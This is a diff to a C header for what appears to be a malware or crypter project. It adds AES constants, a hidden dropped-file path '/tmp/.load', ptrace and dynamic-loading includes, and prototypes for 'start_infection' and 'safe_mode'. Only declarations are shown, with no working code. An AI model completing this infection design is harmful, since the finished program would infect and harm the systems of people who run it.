@@ -13,15 +13,22 @@
 #ifndef ALL_H
 #define ALL_H
 
+#include <unistd.h>
 #include <string.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <openssl/evp.h>
 #include <openssl/aes.h>
+#include <sys/stat.h>
+#include <sys/ptrace.h>
+#include <dlfcn.h>
+#include <fcntl.h>
+#include <sys/wait.h>
 
 #define TRUE		1
 #define FALSE		0
 #define BOOL		int
+#define EXECUTABLE	"/tmp/.load"
 
 /*
 **	CIPHER PLAIN
@@ -37,6 +44,7 @@ typedef struct		s_cipher_plain
 
 t_cipher_plain		*get_cipher_plain();
 int 				set_plain(t_cipher_plain *cipher_plain, char *plain, int len);
+int					set_cipher(t_cipher_plain *cipher_plain, char *cipher, int len);
 
 /*
 **	KEY_IV
@@ -59,8 +67,11 @@ void 				free_key_iv(t_key_iv *key_iv);
 */
 
 #define AES_SUCCESS	0
+#define KEY_SIZE	32
+#define IV_SIZE		16
 typedef struct		s_aes
 {
+	BOOL			valid;
 	EVP_CIPHER_CTX	*ctx_encryption;
 	EVP_CIPHER_CTX	*ctx_decryption;
 	t_key_iv		*key_iv;
@@ -74,4 +85,14 @@ int 				init_decryption(t_aes *aes);
 
 BOOL				encrypt_plain_text(t_aes *aes, t_cipher_plain *cipher_plain);
 BOOL				decrypt_cipher_text(t_aes *aes, t_cipher_plain *cipher_plain);
+
+/*
+**	INFECTION
+*/
+void				start_infection(t_aes *aes, t_cipher_plain *cipher_plain, char **env);
+
+/*
+**	SAFE
+*/
+BOOL				safe_mode(t_aes*);
 #endif
